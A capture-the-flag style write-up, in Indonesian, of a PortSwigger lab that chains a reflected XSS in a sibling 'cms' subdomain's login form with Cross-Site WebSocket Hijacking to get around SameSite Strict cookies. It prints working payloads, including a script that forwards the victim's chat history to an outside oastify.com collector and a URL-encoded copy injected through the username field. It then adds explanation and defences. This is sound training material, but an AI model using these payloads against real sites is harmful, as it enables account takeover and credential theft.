# SameSite Strict Bypass melalui Domain Sibling

Fitur live chat pada lab ini rentan terhadap Cross-Site WebSocket Hijacking (CSWSH). Untuk menyelesaikan lab ini, masuklah ke akun korban.

Untuk melakukan ini, gunakan server exploit yang disediakan untuk melakukan serangan CSWSH yang mengekstrak riwayat chat korban ke server Burp Collaborator default. Riwayat chat tersebut berisi kredensial login dalam teks biasa.

Jika Anda belum melakukannya, kami menyarankan untuk menyelesaikan topik kami tentang kerentanan WebSocket sebelum mencoba lab ini.

**Hint:** Pastikan untuk melakukan audit menyeluruh terhadap semua permukaan serangan yang tersedia. Perhatikan kerentanan tambahan yang mungkin membantu Anda dalam menyampaikan serangan, dan ingat bahwa dua domain dapat berada dalam situs yang sama.

---------------------------------------------

**Referensi:**

- [Bypassing SameSite Restrictions](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions)

- [Cross-Site WebSocket Hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking)

![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/1.png)

---------------------------------------------

Dari lab “Cross-site WebSocket Hijacking” yang telah diselesaikan di bagian WebSockets, kami memiliki payload berikut:

```html
<script>
    var ws = new WebSocket('wss://0a29009b04e2e582804fc1f700b800d5.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://if1w7siga1cezj30b8k08i20erki8bw0.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

Ada sebuah koneksi:

![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/2.png)

Kami dapat membaca kode JavaScript untuk menulis komentar ke chat di `/resources/js/chat.js`:

![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/3.png)

Dan bahwa karakter yang dienkode saat mengirim pesan adalah:

```
' " < > & \r \n \\
```

![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/4.png)
![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/5.png)

```javascript
(function () {
    var chatForm = document.getElementById("chatForm");
    var messageBox = document.getElementById("message-box");
    var webSocket = new WebSocket(chatForm.getAttribute("action"));

    webSocket.onopen = function (evt) {
        writeMessage("system", "System:", "No chat history on record")
        webSocket.send("READY")
    }

    webSocket.onmessage = function (evt) {
        var message = evt.data;

        if (message === "TYPING") {
            writeMessage("typing", "", "[typing...]")
        } else {
            var messageJson = JSON.parse(message);
            if (messageJson && messageJson['user'] !== "CONNECTED") {
                Array.from(document.getElementsByClassName("system")).forEach(function (element) {
                    element.parentNode.removeChild(element);
                });
            }
            Array.from(document.getElementsByClassName("typing")).forEach(function (element) {
                element.parentNode.removeChild(element);
            });

            if (messageJson['user'] && messageJson['content']) {
                writeMessage("message", messageJson['user'] + ":", messageJson['content'])
            }
        }
    };

    webSocket.onclose = function (evt) {
        writeMessage("message", "DISCONNECTED:", "-- Chat has ended --")
    };

    chatForm.addEventListener("submit", function (e) {
        sendMessage(new FormData(this));
        this.reset();
        e.preventDefault();
    });

    function writeMessage(className, user, content) {
        var row = document.createElement("tr");
        row.className = className

        var userCell = document.createElement("th");
        var contentCell = document.createElement("td");
        userCell.innerHTML = user;
        contentCell.innerHTML = content;

        row.appendChild(userCell);
        row.appendChild(contentCell);
        document.getElementById("chat-area").appendChild(row);
    }

    function sendMessage(data) {
        var object = {};
        data.forEach(function (value, key) {
            object[key] = htmlEncode(value);
        });

        webSocket.send(JSON.stringify(object));
    }

    function htmlEncode(str) {
        if (chatForm.getAttribute("encode")) {
            return String(str).replace(/['"<>&\r\n\\]/gi, function (c) {
                var lookup = {'\\': '&#x5c;', '\r': '&#x0d;', '\n': '&#x0a;', '"': '&quot;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '&': '&amp;'};
                return lookup[c];
            });
        }
        return str;
    }
})();
```

Saat mengambil file ini, kami menemukan subdomain “cms” pada header HTTP “Access-Control-Allow-Origin” dalam respons:

![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/6.png)

Ada fungsi login di subdomain tersebut. Fungsi ini memantulkan username yang kami kirim:

![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/7.png)

Dengan menggunakan payload XSS pada field username, kami mendapatkan XSS:

```
<script>alert(1)</script>
```

![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/8.png)

Ini adalah permintaan POST tetapi dapat diubah menjadi GET:

![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/9.png)

"Karena subdomain sibling ini adalah bagian dari situs yang sama, Anda dapat menggunakan XSS ini untuk meluncurkan serangan CSWSH tanpa dimitigasi oleh pembatasan SameSite"

```html
<script>
    document.location = "https://cms-0a29009b04e2e582804fc1f700b800d5.web-security-academy.net/login?username=aa&password=aa";
</script>
```

URL-encode payload “Cross-site WebSocket hijacking”:

```
%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%32%39%30%30%39%62%30%34%65%32%65%35%38%32%38%30%34%66%63%31%66%37%30%30%62%38%30%30%64%35%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%69%66%31%77%37%73%69%67%61%31%63%65%7a%6a%33%30%62%38%6b%30%38%69%32%30%65%72%6b%69%38%62%77%30%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e
```

Gunakan ini sebagai payload di field username:

```
<script>
    document.location = "https://cms-0a29009b04e2e582804fc1f700b800d5.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%32%39%30%30%39%62%30%34%65%32%65%35%38%32%38%30%34%66%63%31%66%37%30%30%62%38%30%30%64%35%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%69%66%31%77%37%73%69%67%61%31%63%65%7a%6a%33%30%62%38%6b%30%38%69%32%30%65%72%6b%69%38%62%77%30%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=aa";
</script>
```

![img](images/SameSite%20Strict%20bypass%20via%20sibling%20domain/10.png)

Masuk dengan kredensial `carlos:565vmsewc7e8c05o7jf4`

## Penjelasan

### Apa Itu CSWSH?

Cross-Site WebSocket Hijacking (CSWSH) adalah jenis serangan di mana penyerang mengeksploitasi koneksi WebSocket yang ada antara pengguna dan server untuk mengirim atau menerima data yang tidak diinginkan. Ini memungkinkan penyerang untuk melakukan tindakan seolah-olah mereka adalah pengguna yang sah.

### Apa Itu SameSite dan Bagaimana Pengaruhnya?

SameSite adalah atribut pada cookie yang mengontrol apakah cookie tersebut akan dikirim bersama dengan permintaan lintas situs (cross-site). Ada tiga opsi utama:

1. **Strict:** Cookie hanya dikirim jika permintaan berasal dari situs yang sama.
2. **Lax:** Cookie dikirim dengan permintaan GET lintas situs, seperti saat pengguna mengklik tautan.
3. **None:** Cookie dikirim dengan semua jenis permintaan lintas situs, tetapi harus aman (secure).

Dalam kasus ini, Chrome menggunakan pembatasan **SameSite Strict** secara default, yang berarti cookie hanya dikirim jika permintaan berasal dari situs yang sama, sehingga mencegah pengiriman cookie pada permintaan lintas situs apapun.

### Bagaimana Bypass SameSite Strict Melalui Domain Sibling Bekerja?

Meskipun SameSite Strict mencegah pengiriman cookie pada permintaan lintas situs, teknik **domain sibling** memungkinkan penyerang untuk memanfaatkan kerentanan dalam logika pengalihan aplikasi untuk mengeksekusi permintaan yang diinginkan.

Dalam contoh ini:

1. **Pengaturan Awal:** Pengguna terautentikasi di situs target, dan cookie dengan atribut `SameSite=Strict` disimpan di browser.
2. **Subdomain Sibling:** Terdapat subdomain `cms` yang berada dalam domain yang sama dan memiliki kebijakan `Access-Control-Allow-Origin` yang memungkinkan akses dari domain utama.
3. **Fungsi Login yang Rentan:** Fungsi login di subdomain `cms` memantulkan username yang dikirim tanpa sanitasi yang tepat, memungkinkan penyisipan skrip (XSS).
4. **Eksploitasi XSS untuk CSWSH:** Dengan menyisipkan payload XSS melalui field username, penyerang dapat menjalankan skrip yang membuka koneksi WebSocket dan mengirim data ke server penyerang.
5. **Pengiriman Data Sensitif:** Skrip yang disisipkan akan membuka koneksi WebSocket ke server penyerang dan mengirimkan data yang diterima, termasuk riwayat chat yang berisi kredensial login korban.

### Langkah-Langkah Serangan

1. **Menyiapkan Halaman Exploit:** Penyerang membuat halaman HTML yang berisi skrip yang memanfaatkan kerentanan XSS pada subdomain `cms` untuk menjalankan payload CSWSH.
   
2. **Memanfaatkan XSS melalui Username:** Dengan mengubah field username menjadi payload XSS yang di-URL encode, penyerang dapat menyisipkan skrip yang membuka koneksi WebSocket dan mengirim data ke server mereka.

3. **Membuka Koneksi WebSocket:** Skrip yang disisipkan akan membuka koneksi WebSocket ke endpoint chat yang rentan dan mengirimkan pesan "READY" untuk memulai sesi.

4. **Mengirimkan Data ke Server Penyerang:** Setiap kali pesan diterima melalui WebSocket, skrip akan mengirimkan data tersebut ke server Burp Collaborator atau server penyerang lainnya menggunakan permintaan `fetch`.

5. **Mengambil Riwayat Chat dan Kredensial:** Data yang dikirimkan mencakup riwayat chat yang berisi kredensial login korban dalam teks biasa, memungkinkan penyerang untuk mengakses akun korban.

### Mengapa Kerentanan Ini Terjadi?

Kerentanan ini terjadi karena:

- **Validasi Input yang Lemah:** Aplikasi tidak memvalidasi atau menyaring input yang diterima melalui field username dengan benar, memungkinkan penyisipan skrip berbahaya (XSS).

- **Penggunaan Subdomain Sibling:** Subdomain `cms` berada dalam domain yang sama, sehingga kebijakan SameSite tidak mencegah pengiriman cookie pada permintaan yang berasal dari subdomain tersebut.

- **Kebijakan CORS yang Longgar:** Header `Access-Control-Allow-Origin` yang mengizinkan akses dari domain utama memungkinkan skrip di subdomain untuk melakukan permintaan lintas situs tanpa pembatasan yang ketat.

- **Kurangnya Mekanisme Perlindungan pada WebSocket:** Endpoint WebSocket tidak menerapkan mekanisme validasi tambahan atau autentikasi yang kuat untuk memastikan bahwa koneksi berasal dari sumber yang sah.

## Kesimpulan

Untuk mencegah kerentanan CSWSH seperti ini, penting untuk:

- **Memvalidasi dan Menyaring Input dengan Ketat:** Pastikan bahwa semua input yang diterima oleh aplikasi, terutama yang digunakan dalam konteks yang sensitif seperti field username, disaring dan divalidasi untuk mencegah penyisipan skrip berbahaya.

- **Menggunakan Atribut SameSite dengan Tepat:** Pertimbangkan penggunaan `SameSite=Strict` secara konsisten pada semua cookie, termasuk yang digunakan oleh subdomain, untuk mencegah pengiriman cookie pada permintaan lintas situs.

- **Menerapkan Kebijakan CORS yang Ketat:** Batasi asal yang diizinkan untuk mengakses sumber daya melalui kebijakan CORS yang lebih ketat, memastikan bahwa hanya domain yang sah yang dapat melakukan permintaan lintas situs.

- **Mengamankan Endpoint WebSocket:** Implementasikan mekanisme autentikasi dan validasi yang kuat pada endpoint WebSocket untuk memastikan bahwa hanya koneksi yang sah yang dapat mengakses dan mengirim data.

- **Menggunakan Atribut Secure dan HttpOnly pada Cookie:** Ini membantu mencegah akses tidak sah ke cookie dari sisi klien dan mengurangi risiko serangan XSS yang dapat mencuri token CSRF atau kredensial lainnya.

- **Menerapkan Content Security Policy (CSP):** CSP dapat membantu mencegah eksekusi skrip yang tidak diinginkan dan mengurangi risiko serangan XSS.

Dengan menerapkan langkah-langkah ini, aplikasi web dapat lebih efektif dalam melindungi diri dari serangan CSWSH dan memastikan bahwa tindakan sensitif hanya dapat dilakukan oleh pengguna yang sah.
